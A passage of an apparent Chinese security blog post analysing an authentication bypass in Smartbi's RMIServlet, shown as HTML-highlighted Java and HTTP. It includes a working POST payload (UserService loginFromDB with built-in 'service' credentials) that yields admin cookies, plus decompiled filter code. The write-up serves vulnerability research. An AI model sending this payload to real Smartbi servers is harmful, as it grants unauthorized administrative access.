style="color: #ABB2BF">            } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">boolean</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">need2Log</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">true</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">HttpServletRequest</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">httpRequest</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (HttpServletRequest)request;</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">httpRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setCharacterEncoding</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;UTF-8&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #E5C07B">HttpSession</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">session</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">httpRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getSession</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (session </span><span style="color: #56B6C2">==</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">null</span><span style="color: #ABB2BF">) {</span></span><span class="line"><span style="color: #ABB2BF">                    need2Log </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #ABB2BF">                } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">className</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">httpRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;className&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">methodName</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">httpRequest</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getParameter</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;methodName&quot;</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">                    need2Log </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">checkNeedToLog</span><span style="color: #ABB2BF">(className, methodName);</span></span><span class="line"><span style="color: #ABB2BF">                }</span></span><span class="line"></span><span class="line"><span style="color: #ABB2BF">                </span><span style="color: #C678DD">if</span><span style="color: #ABB2BF"> (</span><span style="color: #56B6C2">!</span><span style="color: #ABB2BF">need2Log) {</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(httpRequest, response);</span></span><span class="line"><span style="color: #ABB2BF">                } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">RMILog</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">rmiLog</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">RMILog</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">RequestLog</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">requestLog</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">RequestLog</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">ResponseLog</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">responseLog</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">ResponseLog</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">rmiLog</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setRequest</span><span style="color: #ABB2BF">(requestLog);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">rmiLog</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setResponse</span><span style="color: #ABB2BF">(responseLog);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">parseRequestInfo</span><span style="color: #ABB2BF">(httpRequest, requestLog);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">TraceFilter</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">WrapperedResponse</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">wrapResponse</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> TraceFilter.</span><span style="color: #61AFEF">WrapperedResponse</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">, (HttpServletResponse)response);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">long</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">startTime</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">currentTimeMillis</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(httpRequest, wrapResponse);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #C678DD">long</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">duration</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">currentTimeMillis</span><span style="color: #ABB2BF">() </span><span style="color: #56B6C2">-</span><span style="color: #ABB2BF"> startTime;</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">requestLog</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setStart</span><span style="color: #ABB2BF">(startTime);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">responseLog</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">setDuration</span><span style="color: #ABB2BF">(duration);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">this</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">parseResponseInfo</span><span style="color: #ABB2BF">(wrapResponse, responseLog);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">SessionLogService</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getInstance</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">addRMILog</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">session</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getId</span><span style="color: #ABB2BF">(), rmiLog);</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">ServletOutputStream</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">out</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">response</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getOutputStream</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">write</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">wrapResponse</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getResponseData</span><span style="color: #ABB2BF">());</span></span><span class="line"><span style="color: #ABB2BF">                    </span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">flush</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">                }</span></span><span class="line"><span style="color: #ABB2BF">            }</span></span><span class="line"><span style="color: #ABB2BF">        } </span><span style="color: #C678DD">else</span><span style="color: #ABB2BF"> {</span></span><span class="line"><span style="color: #ABB2BF">            </span><span style="color: #E5C07B">chain</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">doFilter</span><span style="color: #ABB2BF">(request, response);</span></span><span class="line"><span style="color: #ABB2BF">        }</span></span><span class="line"><span style="color: #ABB2BF">    }</span></span></code></pre></div></div></figure></li><li><p>根据映射表a进⾏解密，解密出来的字符串根据  空格&#x2F;+  来拆分为三个参数</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] </span><span style="color: #61AFEF">decode</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> data) {</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">char</span><span style="color: #E06C75">[] ibuf </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">char</span><span style="color: #E06C75">[</span><span style="color: #D19A66">4</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> ibufcount </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] obuf </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[</span><span style="color: #E5C07B">data</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">length</span><span style="color: #ABB2BF">()</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">/</span><span style="color: #E06C75"> </span><span style="color: #D19A66">4</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">*</span><span style="color: #E06C75"> </span><span style="color: #D19A66">3</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">+</span><span style="color: #E06C75"> </span><span style="color: #D19A66">3</span><span style="color: #E06C75">]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> obufcount </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">for</span><span style="color: #E06C75">(</span><span style="color: #C678DD">int</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> i </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">data</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">length</span><span style="color: #ABB2BF">();</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">i) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">char</span><span style="color: #E06C75"> ch </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">data</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">charAt</span><span style="color: #ABB2BF">(i);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (ch </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #98C379">&#39;=&#39;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">||</span><span style="color: #E06C75"> ch </span><span style="color: #56B6C2">&lt;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">S_DECODETABLE</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">S_DECODETABLE</span><span style="color: #E06C75">[ch] </span><span style="color: #56B6C2">!=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">127</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            ibuf[ibufcount</span><span style="color: #ABB2BF">++</span><span style="color: #E06C75">] </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> ch</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (ibufcount </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">ibuf</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                ibufcount </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">                obufcount </span><span style="color: #56B6C2">+=</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">decode0</span><span style="color: #E06C75">(ibuf</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> obuf</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> obufcount)</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            }</span></span><span class="line"><span style="color: #E06C75">        }</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">   </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (obufcount </span><span style="color: #56B6C2">==</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">obuf</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">length</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> obuf</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[] ret </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #C678DD">byte</span><span style="color: #E06C75">[obufcount]</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">arraycopy</span><span style="color: #ABB2BF">(obuf, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, ret, </span><span style="color: #D19A66">0</span><span style="color: #ABB2BF">, obufcount);</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> ret</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    }</span></span><span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure></li></ol><p><strong>直接传输</strong></p><figure class="shiki shell"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #61AFEF">POST</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">/smartbi/vision/RMIServlet</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">HTTP/1.1</span></span><span class="line"><span style="color: #61AFEF">Host:</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">127.0</span><span style="color: #98C379">.0.1:18080</span></span><span class="line"><span style="color: #61AFEF">User-Agent:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">Mozilla/5.0</span><span style="color: #ABB2BF"> (Windows </span><span style="color: #98C379">NT</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10.0</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">Win64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">x64</span><span style="color: #ABB2BF">; </span><span style="color: #61AFEF">rv:136.0</span><span style="color: #ABB2BF">) Gecko/20100101 Firefox/136.0</span></span><span class="line"><span style="color: #61AFEF">Content-Type:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">application/x-www-form-urlencoded</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">charset</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UTF-8</span></span><span class="line"><span style="color: #61AFEF">Accept:</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">*</span><span style="color: #98C379">/</span><span style="color: #E5C07B">*</span></span><span class="line"><span style="color: #61AFEF">Origin:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://127.0.0.1</span></span><span class="line"><span style="color: #61AFEF">Referer:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">http://127.0.0.1:18080/smartbi/vision/index.jsp</span></span><span class="line"><span style="color: #61AFEF">Accept-Encoding:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">gzip,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">deflate,</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">br</span></span><span class="line"><span style="color: #61AFEF">Accept-Language:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">zh-CN,zh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.9</span><span style="color: #98C379">,en</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">q</span><span style="color: #56B6C2">=</span><span style="color: #D19A66">0.8</span></span><span class="line"><span style="color: #61AFEF">Cookie:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">JSESSIONID=D451AE905A8C9424DE83D2C921A73D4F</span></span><span class="line"><span style="color: #61AFEF">Connection:</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">keep-alive</span></span><span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #98C379">UserService</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #98C379">login</span><span style="color: #ABB2BF">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #98C379">[&quot;admin&quot;,&quot;admin&quot;]</span></span></code></pre></div></div></figure><p>将RMIServlet解密后的三个字符串，分别传输到 classNam e 、 methodName 和 params 参数中</p><h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><h2 id="内置用户登陆绕过"><a href="#内置用户登陆绕过" class="headerlink" title="内置用户登陆绕过"></a>内置用户登陆绕过</h2><p>安装时会产生内置用户，以特定接口，绕过⽤户身份认证机制，进而获得身份凭证，随后可使⽤获取的身份凭证调⽤后台接⼝，可能导致敏感信息泄露和代码执行</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #E06C75">POST </span><span style="color: #56B6C2">/</span><span style="color: #E06C75">smartbi</span><span style="color: #56B6C2">/</span><span style="color: #E06C75">vision</span><span style="color: #56B6C2">/</span><span style="color: #E5C07B">RMIServlet</span><span style="color: #E06C75"> HTTP</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">1.1</span></span><span class="line"><span style="color: #E06C75">Host</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">x</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">x</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">x</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">x</span></span><span class="line"><span style="color: #E06C75">User</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">Agent</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> Mozilla</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">5.0</span><span style="color: #E06C75"> (Macintosh</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Intel</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Mac</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">OS</span><span style="color: #E06C75"> X </span><span style="color: #D19A66">10_14_3</span><span style="color: #E06C75">) AppleWebKit</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">60</span></span><span class="line"><span style="color: #D19A66">5.1</span><span style="color: #ABB2BF">.</span><span style="color: #FFFFFF">15</span><span style="color: #E06C75"> (KHTML</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> like Gecko) Version</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">12.0</span><span style="color: #ABB2BF">.</span><span style="color: #FFFFFF">3</span><span style="color: #E06C75"> Safari</span><span style="color: #56B6C2">/</span><span style="color: #D19A66">605.1</span><span style="color: #ABB2BF">.</span><span style="color: #FFFFFF">15</span></span><span class="line"><span style="color: #E06C75">Content</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">Type</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> application</span><span style="color: #56B6C2">/</span><span style="color: #E06C75">x</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">www</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">form</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">urlencoded</span></span><span class="line"><span style="color: #E06C75">Accept</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">Encoding</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> gzip</span></span><span class="line"><span style="color: #E06C75">Content</span><span style="color: #56B6C2">-</span><span style="color: #E06C75">Length</span><span style="color: #C678DD">:</span><span style="color: #E06C75"> </span><span style="color: #D19A66">68</span></span><span class="line"><span style="color: #E06C75">className</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">UserService</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">methodName</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">loginFromDB</span><span style="color: #56B6C2">&amp;</span><span style="color: #E06C75">params</span><span style="color: #56B6C2">=</span><span style="color: #E06C75">[</span><span style="color: #98C379">&quot;service&quot;</span><span style="color: #ABB2BF">,</span><span style="color: #98C379">&quot;0a&quot;</span><span style="color: #E06C75">]</span></span></code></pre></div></div></figure><p>解密得到的三个参数</p><h4 id="payload："><a href="#payload：" class="headerlink" title="payload："></a><strong>payload：</strong></h4><p>结果返回true—————&gt;直接利用set-cookie登录后台即可获取管理员权限</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173420964.png"></p><h4 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a><strong>漏洞分析：</strong></h4><ol><li><p>访问项目的web.xml，查看访问&#x2F;vision&#x2F;RMIServlet的过滤 （CheckIsLoggedFilter）</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173422702.png" alt="image-20250811182130105"></p></li><li><p>Smartbi\Tomcat\webapps\smartbi\WEB-INF\lib\smartbi-FreeQuery.jar!\smartbi\freequery\filter\CheckIsLoggedFilter.class</p><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027173424539.png" alt="image-20250811210548785"></p><p>needToCheck ⽅法对传⼊的 类名和⽅法名 进⾏检查，判断是否需要进⾏登录 检查</p></li><li><p>查看needToCheck</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">private</span><span style="color: #E06C75"> </span><span style="color: #C678DD">boolean</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">needToCheck</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> methodName) {</span></span><span class="line"><span style="color: #E06C75">        </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isNullOrEmpty</span><span style="color: #ABB2BF">(className)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">!</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;BIConfigService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">            </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;UserService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span style="color: #56B6C2">&amp;&amp;</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">StringUtil</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">isInArray</span><span style="color: #ABB2BF">(methodName, </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[]{</span><span style="color: #98C379">&quot;login&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;loginFor&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;clickLogin&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;loginFromDB&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;logout&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;isLogged&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;isLoginAs&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;checkVersion&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;hasLicense&quot;</span><span style="color: #ABB2BF">})</span><span style="color: #E06C75">) {</span></span><span class="line"><span style="color: #E06C75">                </span><span style="color: #C678DD">return</span><span style="color: #E06C75"> </span><span style="color: #D19A66">false</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">            } </span><span style="color: #C678DD">else</span><span style="color: #E06C75"> </span><span style="color: #C678DD">if</span><span style="color: #E06C75"> (</span><span style="color: #E5C07B">className</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">equals</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;CompositeService&quot;</span><span style="color: #ABB2BF">)</span><span style="color: #E06C75"> </span><span 